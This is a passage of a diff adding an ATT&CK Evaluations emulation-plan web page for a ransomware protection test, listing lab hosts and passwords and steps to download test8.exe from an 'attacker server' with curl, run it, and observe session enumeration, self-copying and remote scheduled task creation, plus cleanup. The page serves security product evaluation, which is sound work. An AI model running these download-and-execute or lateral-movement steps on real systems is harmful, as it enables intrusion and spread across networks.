+<td>Exposed-Backpack</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><span class="docs-emoji">&#x2B55;</span> Disconnect (<strong>do not sign out</strong>) from <code v-pre>bts (10.222.25.61)</code></p>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP into the victim workstation <code v-pre>exo (10.222.25.62)</code> as <code v-pre>sonicbeats37.fm\sunny</code>.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>exo.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\sunny</td>
+<td>Angular-Porch</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><span class="docs-emoji">&#x2B55;</span> Disconnect (<strong>do not sign out</strong>) from <code v-pre>exo (10.222.25.62)</code></p>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP into the domain controller <code v-pre>blackpink (10.222.15.10)</code> as <code v-pre>sonicbeats37.fm\sooyoung</code>.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>blackpink.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\sooyoung</td>
+<td>Dental-Crew</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><span class="docs-emoji">&#x2B55;</span> Disconnect (<strong>do not sign out</strong>) from <code v-pre>blackpink (10.222.15.10)</code></p>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP into the victim file server <code v-pre>asix (10.222.15.15)</code> as <code v-pre>sonicbeats37.fm\sooyoung</code>.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>asix.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\sooyoung</td>
+<td>Dental-Crew</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>Open an elevated command prompt and execute the following command to download
+the test binary from the attacker server:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">curl.exe --output &quot;C:\Windows\Temp\test8.exe&quot; http://p1nk-p3ncil.net/files/test8.exe</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Change directories to the directory containing the <code v-pre>test8.exe</code> binary.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">cd C:\Windows\Temp</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="biohazard-procedures-7">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-7">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Execute the test binary</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">C:\Windows\Temp\test8.exe</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p>If the command prompt window remains open, look through the log messages to
+confirm that host enumeration, remote file copies, and remote scheduled task
+creation were successful.</p>
+</li>
+<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</p>
+</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Open an elevated PowerShell prompt on the file server and execute the following:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">rm -force C:\Windows\Temp\test8.exe
+Invoke-Command -Computer bts,exo,blackpink -Scriptblock {
+    schtasks /delete /TN &quot;\Microsoft\Windows\Net Session File Management Task&quot; /F;
+    rm -force C:\Windows\System32\test8.exe;
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cmd.exe executes test8.exe</td>
+<td>-</td>
+<td>T1059.003: Command and Scripting Interpreter: Windows Command Shell</td>
+</tr>
+<tr>
+<td>test8.exe enumerates all network sessions connected to the file server</td>
+<td><a href="../resources/protections/test8/src/sessions.cpp#L12">sessions</a></td>
+<td>T1049 System Network Connections Discovery</td>
+</tr>
+<tr>
+<td>test8.exe copies itself to discovered hosts</td>
+<td><a href="../resources/protections/test8/src/main.cpp#L84">main</a></td>
+<td>T1570 Lateral Tool Transfer</td>
+</tr>
+<tr>
+<td>test8.exe creates remote scheduled tasks that execute 15 seconds after being registered</td>
+<td><a href="../resources/protections/test8/src/lat_move.cpp#L28">lat_move</a></td>
+<td>T1053.005 Scheduled Task/Job: Scheduled Task</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/protections/2024/emulation_plan/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Ransomware Protections Micros</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/protections/2024/resources/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Resources</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                        <li>
+                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
+                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                    <g fill="currentColor">
+                                                        <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                    </g>
+                                                </svg>
+                                                <span>ATTACK Evaluations Library GitHub</span>
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Ransomware Protections Micros", level: 5, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
